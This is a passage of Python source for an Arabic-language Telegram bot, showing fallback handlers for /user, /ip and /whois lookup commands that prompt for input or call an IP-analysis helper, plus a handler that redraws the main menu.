    await update.message.reply_text("🔍 ابحث مباشرة الآن:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ إلغاء", callback_data="cb_back")]]))


async def _fallback_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = " ".join(context.args) if context.args else ""
    if not query:
        await update.message.reply_text("👤 أرسل اسم المستخدم أو الشخص للبحث عنه:\n`/user اسم الشخص`", parse_mode="Markdown")
        return
    pending_states[update.effective_user.id] = "osint"
    await update.message.reply_text("🔍 ابحث مباشرة الآن:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ إلغاء", callback_data="cb_back")]]))


async def _fallback_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = context.args[0] if context.args else ""
    if not query:
        await update.message.reply_text("🌐 أرسل عنوان الـ IP:\n`/ip 8.8.8.8`", parse_mode="Markdown")
        return
    msg = await update.message.reply_text("🌐 جاري تحليل الـ IP...")
    await msg.edit_text(analyze_ip(query), parse_mode="Markdown")


async def _fallback_whois(update: Update, context: ContextTypes.DEFAULT_TYPE):
    domain = context.args[0] if context.args else ""
    if not domain:
        await update.message.reply_text("🔎 أرسل النطاق:\n`/whois example.com`", parse_mode="Markdown")
        return
    pending_states[update.effective_user.id] = "osint"
    await update.message.reply_text("🔍 ابحث مباشرة الآن:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ إلغاء", callback_data="cb_back")]]))


async def _cb_unhandled(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج احتياطي لأزرار القائمة التي ليس لها معالج callback — يعيد عرض القائمة الرئيسية."""
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        "اختر من القائمة أدناه 👇",
        reply_markup=build_main_keyboard(update.effective_user.id == ADMIN_ID),
    )

if __name__ == "__main__":
    main()

